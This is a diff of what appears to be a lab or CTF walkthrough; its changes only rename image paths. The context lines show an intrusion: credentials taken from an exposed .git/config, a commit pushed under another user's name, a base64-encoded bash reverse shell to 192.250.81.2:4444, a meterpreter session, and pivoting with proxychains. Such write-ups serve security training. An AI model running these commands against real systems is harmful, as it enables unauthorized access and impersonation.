@@ -75,15 +75,15 @@ One thing that stood out in the nmap scan was this file path
 
 When you visit /.git itself, you receive an error
 
-![](<../../../../.gitbook/assets/image (46) (1).png>)
+![](<../../../../.gitbook/assets/image (46) (1) (1).png>)
 
 However, visiting .git/config gives you a file to download
 
-![](<../../../../.gitbook/assets/image (38) (1).png>)
+![](<../../../../.gitbook/assets/image (38) (1) (1).png>)
 
 And its file content is interesting
 
-![](<../../../../.gitbook/assets/image (40) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (40) (1) (1) (1).png>)
 
 We'll keep these credentials saved just in case they come in handy
 
@@ -103,7 +103,7 @@ Now we have something interesting!
 
 We are presented with an intereactive console where we can execute python expressions, but the console seems to be protected by a PIN
 
-![](<../../../../.gitbook/assets/image (55) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (55) (1) (1) (1).png>)
 
 It doesn't allow unauthenticated access and so far we haven't found a PIN number anywhere.
 
@@ -119,7 +119,7 @@ git clone http://online-calc.com/projects/online-calc
 
 It looks like we can, and we have a couple of files we can take a look at
 
-![](<../../../../.gitbook/assets/image (47) (1).png>)
+![](<../../../../.gitbook/assets/image (47) (1) (1).png>)
 
 These first two files seem to be the code that's running on port 800
 
@@ -127,7 +127,7 @@ However we're more interested in this .git folder
 
 ![](<../../../../.gitbook/assets/image (16) (1).png>)
 
-![](<../../../../.gitbook/assets/image (54) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (54) (1) (1) (1).png>)
 
 Quite a bit of stuff to look through, but I'm sure we'll find something we need to get access to that console
 
@@ -169,7 +169,7 @@ git add .
 git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
 ```
 
-![](<../../../../.gitbook/assets/image (51) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (51) (1) (1) (1).png>)
 
 Git Status
 
@@ -183,7 +183,7 @@ We're commiting this as Jeremy McCarthy because we have his credentials
 
 Next we'll push these changes to the remote repository and enter in the credentials
 
-![](<../../../../.gitbook/assets/image (53) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (53) (1) (1) (1).png>)
 
 We can confirm these changes with curl
 
@@ -191,7 +191,7 @@ We can confirm these changes with curl
 curl http://online-calc.com:8000/API.py
 ```
 
-![](<../../../../.gitbook/assets/image (35).png>)
+![](<../../../../.gitbook/assets/image (35) (1).png>)
 
 ### Reverse Shell
 
@@ -199,14 +199,14 @@ Now we'll prepare our exploit to get a reverse shell on the target machine
 
 It should also be noted the `/` characters in the user payload would be converted to `* 1.0 /` by the `evaluate` function, so we'll use base64 to encode the payload
 
-![](<../../../../.gitbook/assets/image (23) (1).png>)
+![](<../../../../.gitbook/assets/image (23) (1) (1).png>)
 
 ```bash
 echo 'bash -c "bash -i >& /dev/tcp/192.250.81.2/4444 0>&1"' | base64
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjUwLjgxLjIvNDQ0NCAwPiYxIgo=
 ```
 
-![](<../../../../.gitbook/assets/image (17) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (17) (1) (1) (1).png>)
 
 Start a netcat listener
 
@@ -269,7 +269,7 @@ set lhost 192.250.81.2
 run
 ```
 
-![](<../../../../.gitbook/assets/image (39) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (39) (1) (1) (1).png>)
 
 Now we'll change the payload on the compromised machine to an executable and then run it!
 
@@ -280,7 +280,7 @@ chmod +x reverse.elf
 
 Awesome, we've got ourselves a meterpreter shell!
 
-![](<../../../../.gitbook/assets/image (36) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (36) (1) (1) (1).png>)
 
 Now we'll move on to pivoting
 
@@ -292,7 +292,7 @@ ifconfig
 
 As we see, we have the compromised machine IP as well as the second machine that was inaccessible to us before: `192.218.10.2`
 
-![](<../../../../.gitbook/assets/image (29) (1).png>)
+![](<../../../../.gitbook/assets/image (29) (1) (1).png>)
 
 We will now add this route
 
@@ -306,7 +306,7 @@ use auxiliary/scanner/portscan/tcp
 show options
 ```
 
-![](<../../../../.gitbook/assets/image (34) (1).png>)
+![](<../../../../.gitbook/assets/image (34) (1) (1).png>)
 
 Running an nmap scan against the second target yields us these results
 
@@ -324,7 +324,7 @@ So why use proxychains? This [article ](https://medium.com/swlh/proxying-like-a-
 
 Using a socks proxy can be understood from [this](https://blog.pentesteracademy.com/network-pivoting-using-metasploit-and-proxychains-c04472f8eed0) article and [this](https://nullsweep.com/pivot-cheatsheet-for-pentesters/) other one
 
-![](<../../../../.gitbook/assets/image (29).png>)
+![](<../../../../.gitbook/assets/image (29) (1).png>)
 
 ```
 proxychains nmap -sT -P0 192.218.10.2
